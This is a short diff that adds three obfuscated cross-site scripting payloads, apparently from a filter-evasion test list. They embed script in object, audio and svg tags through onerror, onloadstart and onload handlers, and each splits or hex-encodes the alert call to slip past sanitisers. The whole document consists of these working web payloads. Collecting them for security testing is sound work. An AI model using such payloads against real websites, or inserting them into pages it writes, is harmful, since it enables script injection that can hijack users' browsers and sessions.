@@ -1,0 +1,3 @@
+<object data="data:text/html,<img src='x' onerror='setTimeout(`ale`+`rt(1)`,100)'>"></object>
+<audio src onloadstart="setTimeout(unescape('%61%6c%65%72%74(1)'),100)"></audio>
+<svg/onload=setTimeout('ale'+'rt(1)',100)></svg>
